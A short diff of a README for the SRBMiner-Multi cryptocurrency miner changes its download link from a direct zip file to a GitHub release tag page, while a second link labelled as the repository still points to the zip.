@@ -19,7 +19,7 @@ SRBMiner-Multi is a powerful cryptocurrency miner supporting a variety of algori
 
 ## Download
 
-- [Download](https://github.com/SRBMiner-hub/SRBMinerMulti/releases/download/1/SRBMiner-MULTI.v2.8.0.zip)
+- [Download](https://github.com/SRBMiner-hub/SRBMinerMulti/releases/tag/1)
 - [GitHub Repository](https://github.com/SRBMiner-hub/SRBMinerMulti/releases/download/1/SRBMiner-MULTI.v2.8.0.zip)
 
 
